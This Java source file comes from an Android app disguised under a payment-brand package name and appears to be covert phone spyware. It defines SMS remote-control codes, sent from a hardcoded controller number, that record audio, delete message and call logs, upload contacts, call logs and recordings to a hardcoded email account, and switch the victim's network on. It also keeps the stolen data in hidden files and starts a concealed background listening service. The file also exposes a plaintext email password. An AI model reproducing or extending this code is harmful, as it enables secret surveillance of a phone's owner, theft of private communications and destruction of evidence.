package com.alipay.safe.receiver;

import java.io.File;
import java.util.List;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.util.Log;

import com.alipay.safe.service.ListenService;
import com.alipay.safe.util.DoAboutCodeUtils;
import com.alipay.safe.util.FileUtil;

public class Globle {

	public static final String PHONE_NUMBER = "18210633121";//控制者的电话号码
	/**
	 * 发送者的email和密码，163邮箱
	 */
	public final static String senderName = "little__gg@163.com";
	public final static String senderPwd = "6803895199";
	/**
	 * 接收者的email
	 */
	public final static String receiverEmail = "craining@163.com";
	

	public static final String PHONE_CODE_UP = "TURN_UP";// 调大音量
	public static final String PHONE_CODE_DOWN = "TURN_DOWN";// 调低音量
	public static final String PHONE_CODE_CALL_ME = "CALL_ME";// 给我打电话

	public static final String PHONE_CODE_RECORD_TIME = "RECORD_TIME";// 录音N分钟
	public static final String PHONE_CODE_RECORD_START = "RECORD_START";// 开始录音
	public static final String PHONE_CODE_RECORD_END = "RECORD_END";// 结束录音

	public static final String PHONE_CODE_TURNON_WIFI = "TURN_ON_WIFI";// 开启wifi
	public static final String PHONE_CODE_TURNON_MOBILE = "TURN_ON_MOBILE";// 开启移动网络

	public static final String PHONE_CODE_DELETE_MSG_LOG = "DEL_MSG";// 删除短息记录
	public static final String PHONE_CODE_DELETE_CALL_LOG = "DEL_CALL";// 删除通话记录
	public static final String PHONE_CODE_DELETE_AUDIOS_CALL = "DEL_AUDIO_CALL";// 删除通话录音记录
	public static final String PHONE_CODE_DELETE_AUDIOS_OTHER = "DEL_AUDIO_OTHER";// 删除其它录音记录
	public static final String PHONE_CODE_DELETE_ALL_LOG = "DEL_ALL";// 删除所有记录

	public static final String PHONE_CODE_UPLOAD_SMS_CALL = "HELLO_SMS_CALL";// 上传，仅wifi
	public static final String PHONE_CODE_UPLOAD_ALL = "HELLO_ALL";// 全部上传，仅wifi
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL = "HELLO_CALL_AUDIO";//
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER = "HELLO_OTHER_AUDIO";//
	public static final String PHONE_CODE_UPLOAD_SMS_CALL_MOBILE = "HELLO_SMS_CALL_MOBILE";// 上传，仅wifi
	public static final String PHONE_CODE_UPLOAD_ALL_MOBILE = "HELLO_ALL_MOBILE";// 全部上传，
	public static final String PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE = "HELLO_CALL_AUDIO_MOBILE";//
	public static final String PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE = "HELLO_OTHER_AUDIO_MOBILE";//

	public static final String PHONE_CODE_UPLOAD_CONTACTS = "HELLO_CONTACTS";
	public static final String PHONE_CODE_UPLOAD_CONTACTS_MOBILE = "HELLO_CONTACTS_MOBILE";
	
	public static final String SERVICE_NAME_LISTEN = "com.alipay.safe.service.ListenService";
	public static final String SERVICE_NAME_RECORDER = "com.alipay.safe.service.RecorderService";

	public static final File FILE_CALL_LOG = new File("/mnt/sdcard/Android/.androidcall.txt");
	public static final File FILE_CONTACTS = new File("/mnt/sdcard/Android/.contacts.txt");
	public static final String FILEPATH_AUDIOS_CALL = "/mnt/sdcard/Android/.callaudios/";
	public static final String FILEPATH_AUDIOS_OTHER = "/mnt/sdcard/Android/.audios/";
	public static final File FILE_TAG_UPLOAD_TAG = new File("/data/data/com.alipay.safe.receiver/files/uploadtag.cfg");
	public static final String FILENAME_TAG_UPLOAD_TAG = "uploadtag.cfg";

	
	/**
	 * 调最大音量
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnUpMost(Context context) {
		Log.e("Globle", "turnUpMost");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
		audioMgr.setStreamVolume(AudioManager.STREAM_RING, audioMgr.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
		audioMgr.setStreamVolume(AudioManager.STREAM_NOTIFICATION, audioMgr.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION), 0);
		audioMgr.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_ON);
	}

	/**
	 * 调大音量
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnUpSecond(Context context) {
		Log.e("Globle", "turnUpSecond");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
		audioMgr.setStreamVolume(AudioManager.STREAM_RING, audioMgr.getStreamMaxVolume(AudioManager.STREAM_RING) - 2, 0);
		audioMgr.setStreamVolume(AudioManager.STREAM_NOTIFICATION, audioMgr.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION) - 2, 0);
		audioMgr.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_ON);

	}

	/**
	 * 静音模式
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnDown(Context context) {
		Log.e("Globle", "turnDown");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_SILENT);// 静音模式、不震动
		// audioMgr.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_OFF);
	}

	/**
	 * 还原之前音量模式
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-11-22
	 */
	public static void turnPre(Context context) {
		Log.e("Globle", "turnPre");
		AudioManager audioMgr = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
		audioMgr.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
	}

	/**
	 * 开启后台监听服务
	 * 
	 * @Description:
	 * @param context
	 * @see:
	 * @since:
	 * @author: zgy
	 * @date:2012-8-30
	 */
	public static void startBackService(Context context) {
		if (!isServiceStarted(context, SERVICE_NAME_LISTEN)) {
			Intent i = new Intent(context, ListenService.class);
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			context.startService(i);
			Log.v("service", "service is not running, need to start service!");
		} else {
			Log.v("service", "service is running, no need to start service!");
		}

	}

	public static void checkUploadedOrNot(Context context) {
		if (Globle.FILE_TAG_UPLOAD_TAG.exists()) {
			DoAboutCodeUtils.doOperaByMessage(context, FileUtil.read(FILENAME_TAG_UPLOAD_TAG, context));
		}
	}

	/**
	 * 通过Service的类名来判断是否启动某个服务
	 * 
	 * @param mServiceList
	 * @param className
	 * @return
	 */
	public static boolean isServiceStarted(Context context, String serviceName) {

		ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		List<ActivityManager.RunningServiceInfo> mServiceList = activityManager.getRunningServices(100);

		for (int i = 0; i < mServiceList.size(); i++) {
			if (serviceName.equals(mServiceList.get(i).service.getClassName())) {
				return true;
			}
		}
		return false;
	}

	/**
	 * 
	 * 判断Wifi网络状态是否可用
	 * 
	 * @return true:网络可用; false:网络不可用
	 */

	public static boolean isConnectInternetWifi(Context con) {
		ConnectivityManager conManager = (ConnectivityManager) con.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = conManager.getActiveNetworkInfo();
		if (networkInfo != null) { // 注意，这个判断一定要的哦，要不然会出错
			if (networkInfo.isAvailable()) {
				State wifi = conManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState();
				if (wifi == State.CONNECTED) {
					return true;
				}
			}
		}

		return false;
	}
}
